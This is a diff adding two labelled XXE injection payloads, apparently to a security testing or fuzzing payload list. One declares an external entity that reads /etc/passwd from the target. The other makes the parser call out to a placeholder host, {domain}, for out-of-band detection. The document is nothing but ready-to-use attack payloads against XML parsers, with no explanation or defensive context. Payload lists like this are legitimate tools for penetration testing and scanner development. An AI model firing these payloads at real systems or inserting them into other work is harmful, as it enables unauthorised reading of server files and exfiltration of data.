@@ -1,0 +1,4 @@
+##POLYGLOT - XXE (File Read)##
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+##POLYGLOT - XXE (OOB)##
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{domain}/xxe">]><foo>&xxe;</foo>
